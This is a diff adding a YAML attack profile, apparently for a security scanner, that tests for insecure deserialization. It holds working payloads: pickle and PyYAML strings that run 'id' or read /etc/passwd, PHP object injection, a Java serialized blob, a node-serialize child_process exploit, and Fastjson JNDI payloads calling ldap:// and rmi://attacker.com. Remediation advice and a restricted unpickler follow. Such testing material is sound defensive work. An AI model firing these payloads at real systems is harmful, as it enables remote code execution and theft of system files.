@@ -1,0 +1,151 @@
+# Insecure Deserialization Attack Profile
+# This file defines payloads for testing insecure deserialization vulnerabilities
+
+name: "Insecure Deserialization"
+category: "injection"
+severity: "critical"
+description: "Tests for insecure deserialization vulnerabilities in Java, Python, PHP, Ruby, Node.js, and .NET that can lead to Remote Code Execution (RCE)"
+
+# Fields commonly vulnerable to deserialization attacks
+target_fields:
+  - "data"
+  - "state"
+  - "viewstate"
+  - "object"
+  - "serialized"
+  - "payload"
+  - "token"
+  - "session"
+  - "cookie"
+  - "auth"
+  - "config"
+  - "params"
+  - "query"
+  - "xml"
+  - "json"
+
+success_indicators:
+  - "java.io.InvalidClassException"
+  - "java.lang.Runtime"
+  - "org.apache.commons.collections"
+  - "root:x:0:0"
+  - "daemon:x:"
+  - "uid=0(root)"
+  - "Active code page:"
+  - "Microsoft Windows [Version"
+  - "PHP Fatal error: Uncaught"
+  - "Object of class"
+  - "unserialize(): Error"
+  - "pickle.UnpicklingError"
+  - "yaml.constructor.ConstructorError"
+  - "SECURITY WARNING: treating undefined"
+
+# Attack payloads to test
+payloads:
+  # --- Python Pickle RCE ---
+  # cos\nsystem\n(S'id'\ntR.
+  - "cos\nsystem\n(S'id'\ntR."
+  # cos\nsystem\n(S'whoami'\ntR.
+  - "cos\nsystem\n(S'whoami'\ntR."
+  # Pickle opcode for sleep 10
+  - "cos\nsystem\n(S'sleep 10'\ntR."
+  # Base64 encoded pickle (id)
+  - "gANjcG9zaXgKc3lzdGVtCnEAWAIAAABpZHEBhXECUnEDLg=="
+  # Base64 encoded pickle (uname -a)
+  - "gANjcG9zaXgKc3lzdGVtCnEAWAgAAAB1bmFtZSAtYXEBhXECUnEDLg=="
+
+  # --- Python PyYAML Unsafe Load ---
+  # RCE using os.system
+  - "!!python/object/apply:os.system ['id']"
+  # RCE using subprocess.check_output
+  - "!!python/object/apply:subprocess.check_output [['ls', '-l']]"
+  # File read
+  - "!!python/object/apply:subprocess.check_output [['cat', '/etc/passwd']]"
+
+  # --- PHP Object Injection ---
+  # Generic object injection
+  - 'O:8:"Exploit":1:{s:7:"command";s:2:"id";}'
+  # PHP object injection — deserialized User object with admin name
+  - 'O:4:"User":1:{s:4:"name";s:5:"admin";}'
+  # PHP Monolog gadget (stub - replace with real gadget chain payload from phpggc)
+  # phpggc Monolog/RCE1 system id | base64
+  # Array wrapper bypass
+  - 'a:2:{i:0;O:8:"Exploit":0:{}i:1;s:4:"test";}'
+
+  # --- Java Deserialization (Base64) ---
+  # Magic bytes: AC ED 00 05 (Hex) -> rO0AB (Base64) - Common start
+  # Just the header to trigger potential detailed errors
+  - "rO0ABQ=="
+  # CommonsCollections1 (URLDNS - harmless ping)
+  - "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTAYfeZsZ7C5DAwAHSQAIcG9ydGwAB3Byb3RvY29sdAASTGphdmEvbGFuZy9TdHJpbmc7TAAEaG9zdHEAfgADTAAEZmlsZXEAfgADeHAAAAAAdAAHZGF0YQ=="
+  # CommonsCollections5 (Sleep 10 - generate with ysoserial)
+  # java -jar ysoserial.jar CommonsCollections5 'sleep 10' | base64
+  # - "<base64 output goes here>"
+
+  # --- Node.js Serialization (node-serialize) ---
+  # IIFE RCE
+  - '{"rce":"_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"id\", function(error, stdout, stderr) { console.log(stdout) });}()"}'
+  # Simple logging
+  - '{"rce":"_$$ND_FUNC$$_function (){console.log(\"pwned\")}()"}'
+
+  # --- Ruby Marshal ---
+  # Ruby Marshal (empty array)
+  - "BAhbAA=="
+  # YAML.load (unsafe)
+  - "--- !ruby/object:Gem::Installer\n    i: x\n"
+  
+  # --- .NET ViewState ---
+  # Dummy base64 ViewState
+  - "/wEPDwUKLTkwOTY4NTg0Mw9kFgICAw9kFgICBQ8WAh4HZW5jdHlwZQUEbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk"
+
+  # --- Fastjson (Java) ---
+  # JNDI injection (LDAP)
+  - '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}'
+  # JNDI injection (RMI)
+  - '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker.com/Exploit","autoCommit":true}'
+
+  # --- Jackson (Java) ---
+  # Gadget probe
+  - '["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3"}]'
+
+remediation: |
+  # Safe Deserialization Guidelines
+
+  1. **Avoid Native Deserialization:**
+     Do not accept serialized objects from untrusted sources.
+     Use secure data formats like JSON or XML (without external entities) instead of `pickle`, `Marshal`, `php_serialize`, or Java serialization.
+
+  2. **Signature Verification:**
+     If serialization is required, sign the data with an integrity check (HMAC) on the server.
+     Verify the signature *before* attempting to deserialize.
+
+  3. **Type/Class Whitelisting (Look-ahead Deserialization):**
+     **Java:** Use `ValidatingObjectInputStream` (Apache Commons IO) or `SerialFilter` (JEP 290) to allow only specific safe classes.
+     **Python:** Override `find_class` in `pickle.Unpickler` to restrict allowed globals.
+     **PHP:** Use `allowed_classes` option in `unserialize($data, ["allowed_classes" => ["MySafeClass"]])`.
+
+  4. **Update Libraries:**
+     Ensure all dependencies (Jackson, Fastjson, XStream, etc.) are patched to the latest versions to mitigate known gadget chains.
+
+  # Python Safe Pickle Example (Restricted Unpickler)
+
+  import pickle
+  import io
+
+  class SafeUnpickler(pickle.Unpickler):
+      def find_class(self, module, name):
+          # Only allow safe primitive types
+          if module == "builtins" and name in {"str", "list", "dict", "set", "int", "float", "bool"}:
+              return getattr(__import__(module), name)
+          # Block everything else
+          raise pickle.UnpicklingError(f"Global '{module}.{name}' is forbidden")
+
+  def safe_loads(data):
+      return SafeUnpickler(io.BytesIO(data)).load()
+
+references:
+  - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+  - "https://cwe.mitre.org/data/definitions/502.html"
+  - "https://github.com/frohoff/ysoserial"
+  - "https://portswigger.net/web-security/deserialization"
+  - "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
